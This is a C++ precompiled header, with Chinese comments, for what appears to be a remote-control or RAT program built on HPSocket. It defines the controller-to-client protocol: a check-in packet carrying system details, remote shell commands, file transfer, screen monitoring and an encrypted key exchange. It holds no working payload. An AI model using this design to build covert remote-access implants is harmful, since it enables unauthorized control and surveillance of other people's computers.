// pch.h: 这是预编译标头文件。
// 下方列出的文件仅编译一次，提高了将来生成的生成性能。
// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。
// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。
// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。

#ifndef PCH_H
#define PCH_H

// 添加要在此处预编译的标头

#include "./HPSocket/HPSocket.h"


// 这样不行，要在工程属性-> C/C++ -> 预处理器 -> 预处理器定义 中定义预处理宏HPSOCKET_STATIC_LIB
//#ifndef HPSOCKET_STATIC_LIB
//	#define HPSOCKET_STATIC_LIB
//#endif


#ifdef _DEBUG
	#pragma comment(lib, "./HPSocket/HPSocket_UD.lib")
#else
	#pragma comment(lib, "./HPSocket/HPSocket_U.lib")
#endif


#include <iostream>



enum COMMAND_ID {
	CRYPTO_KEY,				// 仅用于主控端收到被控端传来的通信密钥和IV时，发此包告知被控端已接收密钥

	LOGIN,					// 上线包

	ECHO,					// 测试

	// 远程SHELL
	SHELL_CONNECT,			// 被控端新建一条子socket用于远程SHELL
	SHELL_EXECUTE,			// 执行SHELL
	SHELL_CLOSE,			// 关闭SHELL


	FILE_TRANSFOR,			// 文件传输
	SCREEN_MONITOR,			// 屏幕监控
	MESSAGE_BOX,			// 弹窗
};


enum CLIENT_STATUS {
	NOT_ONLINE,			// 客户端（即受控端）不在线
	//HAVE_CRYPTO_KEY,	// 主控端接收到了被控端发来的对称密钥。这阶段的包是明文的（后续可能改成RSA加密）。
	WAIT_FOR_LOGIN,		// 等待上线包（使用对称加密算法加密），该包有IP，CPU，系统版本等信息。
	LOGINED				// 已登录，（接收到通信密钥和上线包后）正式建立通信。
};





#include  "strsafe.h"
#include <assert.h>


#define CRYPTO_KEY_PACKET_LENGTH 33
#define CRYPTO_KEY_PACKET_TOKEN_FOR_MAIN_SOCKET (0xAB)
#define CRYPTO_KEY_PACKET_TOKEN_FOR_CHILD_SOCKET (0xCD)






#endif //PCH_H
